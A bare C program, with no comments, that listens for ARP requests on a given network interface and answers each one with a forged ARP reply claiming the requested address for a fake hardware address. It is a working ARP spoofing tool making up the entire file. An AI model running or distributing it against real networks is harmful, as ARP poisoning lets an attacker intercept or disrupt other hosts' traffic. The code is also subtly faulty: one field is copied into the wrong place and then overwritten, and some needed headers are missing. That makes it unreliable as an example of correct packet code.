#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <sys/types.h>
#include <unistd.h>



struct buf_st
{
    struct ether_arp ea;
};

int main(int c, char **v)
{
    int ret, sd;
    struct sockaddr_ll myend, hisend;
    socklen_t hisend_len;
    struct buf_st buf, sbuf;
    
    setuid(0);
    if (c < 2)
    {
        fprintf(stderr, "usage...\n");
        exit(1);
    }

    sd = socket(PF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
    if (-1 == sd)
    {
        perror("socket()");
        exit(1);
    }

#if 1
    myend.sll_family = AF_PACKET;
    myend.sll_protocol = htons(ETH_P_ARP);
    myend.sll_ifindex = if_nametoindex(v[1]);
    if (myend.sll_ifindex == 0)
    {
        perror("if_nametoindex()");
        exit(1);
    }

    ret = bind(sd, (struct sockaddr *)&myend, sizeof(myend));
    if (-1 == ret)
    {
        perror("bind");
        exit(1);
    }
#endif
    sbuf.ea.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    sbuf.ea.ea_hdr.ar_pro = htons(ETH_P_IP);
    sbuf.ea.ea_hdr.ar_hln = ETH_ALEN;
    sbuf.ea.ea_hdr.ar_pln = 4;
    sbuf.ea.ea_hdr.ar_op = htons(ARPOP_REPLY);

    hisend_len = sizeof(hisend);
    while (1)
    {
        ret = recvfrom(sd, &buf, sizeof(buf), 0, (struct sockaddr *)&hisend,
                &hisend_len);
        if (-1 == ret)
        {
            perror("recvfrom");
            exit(1);
        }

        if (ntohs(buf.ea.ea_hdr.ar_op) == ARPOP_REQUEST)
        {
            printf("*: ");
            printf("%s ", inet_ntoa(*(u_int32_t *)(buf.ea.arp_spa)));
            printf("is asking %s's MAC.\n", inet_ntoa(*(u_int32_t*)(buf.ea.arp_tpa)));

            memcpy(sbuf.ea.arp_sha, "123456", ETH_ALEN);
            memcpy(sbuf.ea.arp_spa, buf.ea.arp_tpa, 4);
            memcpy(sbuf.ea.arp_tpa, buf.ea.arp_sha, ETH_ALEN);
            memcpy(sbuf.ea.arp_tpa, buf.ea.arp_spa, 4);

            hisend.sll_family = AF_PACKET;
            memcpy(hisend.sll_addr, buf.ea.arp_sha, ETH_ALEN);
            hisend.sll_halen = ETH_ALEN;
            hisend.sll_ifindex = if_nametoindex(v[1]);

            ret = sendto(sd, &sbuf, sizeof(sbuf), 0, (struct sockaddr *)&hisend, sizeof(hisend));
            if (-1 == ret)
            {
                perror("sendto()");
                exit(1);
            }
            printf("\tFake answer sent.\n");
        }
    }
}

